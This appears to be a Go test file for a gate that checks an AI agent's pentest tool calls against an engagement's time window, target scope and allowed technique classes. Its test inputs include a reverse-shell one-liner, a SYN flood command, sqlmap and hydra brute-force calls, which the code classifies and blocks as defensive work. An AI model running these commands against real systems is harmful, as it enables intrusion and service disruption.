package intercept

import (
	"context"
	"errors"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/db"
)

// withArtifact gives the fixture's task an artifact in force now, with the
// given scope and techniques.
func (g *gateFixture) withArtifact(scope []db.AuthScopeEntry, techniques ...string) *db.EngagementAuthorization {
	now := time.Now().UTC()
	a := &db.EngagementAuthorization{ID: 1, TaskID: 7, Version: 1, Reference: "SOW-1", Scope: scope, Techniques: techniques,
		NotBefore: now.Add(-time.Hour), NotAfter: now.Add(time.Hour)}
	g.store.auth = a
	return a
}

func (g *gateFixture) lastOutcome() string {
	g.t.Helper()
	out := g.store.outcomes()
	if len(out) == 0 {
		g.t.Fatal("no decided row was logged")
	}
	return out[len(out)-1]
}

var exampleScope = []db.AuthScopeEntry{{Kind: db.AuthScopeDomain, Value: "example.com"}, {Kind: db.AuthScopeCIDR, Value: "203.0.113.0/24"}}

func TestAuthorizationWindow(t *testing.T) {
	g := newGate(t)
	g.res.set("app.example.com", "203.0.113.7")
	a := g.withArtifact(exampleScope)

	g.requests("inside the window, in scope: the gate's own flow", g.fetch(appURL))

	a.NotBefore, a.NotAfter = time.Now().Add(time.Hour), time.Now().Add(2*time.Hour)
	res := g.blocked("before the window", AuthorizationOutOfWindow, g.fetch(appURL))
	if !strings.Contains(res.Reason, "SOW-1") {
		t.Errorf("reason %q does not name the artifact", res.Reason)
	}
	if got := g.lastOutcome(); got != "denied/authorization_window" {
		t.Errorf("outcome = %q", got)
	}

	a.NotBefore, a.NotAfter = time.Now().Add(-2*time.Hour), time.Now().Add(-time.Hour)
	g.blocked("after the window (expired)", AuthorizationOutOfWindow, g.fetch(appURL))
	// A command with no declared target is refused too: it can still reach one.
	g.blocked("target-less command after expiry", AuthorizationOutOfWindow, g.check("Bash", `{"command":"ls -la"}`))
	// A tool that cannot reach any target is not.
	g.passes("local tool after expiry", g.check("Read", `{"file_path":"/tmp/x"}`))
	g.passes("local tool wrapped in ExecuteExtraTool", g.check(executeExtraTool, `{"tool_name":"record_fact","params":{"text":"x"}}`))

	a.NotBefore, a.NotAfter = time.Now().Add(-time.Hour), time.Now().Add(time.Hour)
	a.Revoked = true
	g.blocked("revoked", AuthorizationRevoked, g.fetch(appURL))
	if got := g.lastOutcome(); got != "denied/authorization_revoked" {
		t.Errorf("outcome = %q", got)
	}
}

func TestAuthorizationScope(t *testing.T) {
	g := newGate(t)
	g.res.set("app.example.com", "203.0.113.7")
	g.res.set("example.com", "203.0.113.8")
	g.res.set("evil.test", "198.51.100.1")
	g.withArtifact(exampleScope)

	g.requests("subdomain of a domain entry", g.fetch(appURL))
	g.requests("the domain itself", g.fetch("https://example.com/"))
	res := g.blocked("another domain", AuthorizationOutOfScope, g.fetch("https://evil.test/"))
	if res.Host != "evil.test" {
		t.Errorf("block names %q", res.Host)
	}
	if got := g.lastOutcome(); got != "denied/authorization_scope" {
		t.Errorf("outcome = %q", got)
	}
	g.blocked("a suffix that is not a subdomain", AuthorizationOutOfScope, g.fetch("https://notexample.com/"))
	g.requests("an address in a CIDR entry", g.check("Bash", `{"command":"curl http://203.0.113.9/"}`))
	g.blocked("an address outside", AuthorizationOutOfScope, g.check("Bash", `{"command":"curl http://198.51.100.9/"}`))
	g.blocked("a prefix wider than the entry", AuthorizationOutOfScope, g.check("Bash", `{"command":"nmap 203.0.112.0/23"}`))
	// One target out of scope refuses the whole call.
	g.blocked("mixed call", AuthorizationOutOfScope, g.check("Bash", `{"command":"curl http://203.0.113.9/ http://198.51.100.9/"}`))

	// A name is never matched by an address entry, even if it resolves into it.
	g.withArtifact([]db.AuthScopeEntry{{Kind: db.AuthScopeCIDR, Value: "203.0.113.0/24"}})
	g.blocked("name against address-only scope", AuthorizationOutOfScope, g.fetch(appURL))
	// An empty scope leaves the targets to the gate's other checks.
	g.withArtifact(nil)
	g.requests("empty scope", g.fetch("https://evil.test/"))
}

func TestAuthorizationTechniques(t *testing.T) {
	g := newGate(t)
	g.withArtifact(exampleScope, TechniqueRecon, TechniqueScanning)

	g.requests("allowed class", g.check("Bash", `{"command":"nmap -sV 203.0.113.9"}`))
	res := g.blocked("class not allowed", AuthorizationTechniqueDenied, g.check("Bash", `{"command":"sqlmap -u http://203.0.113.9/?id=1"}`))
	if !strings.Contains(res.Reason, TechniqueExploitation) {
		t.Errorf("reason %q does not name the class", res.Reason)
	}
	if got := g.lastOutcome(); got != "denied/authorization_technique" {
		t.Errorf("outcome = %q", got)
	}
	g.blocked("class not allowed, no declared target", AuthorizationTechniqueDenied, g.check("Bash", `{"command":"hydra -L users -P pw ssh://$T"}`))
	g.blocked("MCP tool named for the class", AuthorizationTechniqueDenied, g.check("mcp__kali__sqlmap_scan", `{"url":"http://203.0.113.9/"}`))
	g.passes("unclassified, no target", g.check("Bash", `{"command":"jq . out.json"}`))
}

func TestAuthorizationGateOff(t *testing.T) {
	g := newGate(t)
	g.withArtifact(exampleScope, TechniqueRecon)
	off := TargetScope{TaskID: "7", Enabled: func() bool { return false }, Interceptor: g.ic}
	check := func(tool, input string) TargetResult {
		return g.ic.CheckUngated(context.Background(), off, tool, []byte(input))
	}
	if res := check("WebFetch", `{"url":"https://evil.test/"}`); res.Code != AuthorizationOutOfScope {
		t.Errorf("out of scope with the gate off: %+v", res)
	}
	if res := check("Bash", `{"command":"nmap 203.0.113.9"}`); res.Code != AuthorizationTechniqueDenied {
		t.Errorf("technique with the gate off: %+v", res)
	}
	if res := check("WebFetch", `{"url":"https://app.example.com/"}`); res.Code != "" {
		t.Errorf("in scope with the gate off: %+v", res)
	}
	g.store.auth.NotAfter = time.Now().Add(-time.Minute)
	if res := check("Bash", `{"command":"ls"}`); res.Code != AuthorizationOutOfWindow {
		t.Errorf("expired with the gate off: %+v", res)
	}
}

func TestAuthorizationStoreFailureFailsClosed(t *testing.T) {
	g := newGate(t)
	g.store.fail["Authorization"] = errors.New("db down")
	g.blocked("unreadable artifact", TargetGateUnavailable, g.fetch(appURL))
	g.blocked("unreadable artifact, no target", TargetGateUnavailable, g.check("Bash", `{"command":"ls"}`))
}

func TestAuthorizationNoArtifactUnchanged(t *testing.T) {
	g := newGate(t)
	g.res.set("evil.test", "198.51.100.1")
	g.requests("no artifact: the gate's own flow", g.fetch("https://evil.test/"))
	g.passes("no artifact, no target", g.check("Bash", `{"command":"sqlmap --version"}`))
	if len(g.store.logged) != 0 {
		t.Errorf("rows logged without an artifact: %+v", g.store.logged)
	}
}

func TestClassifyTechniques(t *testing.T) {
	for _, tc := range []struct {
		tool, input string
		want        []string
	}{
		{"Bash", `{"command":"nmap -p- host && ffuf -u http://h/FUZZ"}`, []string{TechniqueScanning, TechniqueFuzzing}},
		{"Bash", `{"command":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}`, []string{TechniquePostExploitation}},
		{"Bash", `{"command":"hping3 --flood -S h"}`, []string{TechniqueDenialOfService}},
		{"Bash", `{"command":"cat nmap-output.txt"}`, nil},
		{"Bash", `{"command":"python3 dig.py"}`, nil},
		{"Bash", `{"command":"/usr/bin/nmap h"}`, []string{TechniqueScanning}},
		{"Read", `{"file_path":"/tmp/sqlmap.log"}`, nil},
		{"WebFetch", `{"url":"https://h/sqlmap"}`, nil},
		{"mcp__scanner__nuclei_run", `{"note":"hydra later"}`, []string{TechniqueScanning}},
		{"custom_runner", `{"cmd":"subfinder -d example.com"}`, []string{TechniqueRecon}},
		{executeExtraTool, `{"tool_name":"Bash","params":{"command":"sqlmap -u x"}}`, []string{TechniqueExploitation}},
	} {
		if got := ClassifyTechniques(tc.tool, []byte(tc.input)); !slices.Equal(got, tc.want) {
			t.Errorf("%s %s = %v, want %v", tc.tool, tc.input, got, tc.want)
		}
	}
}
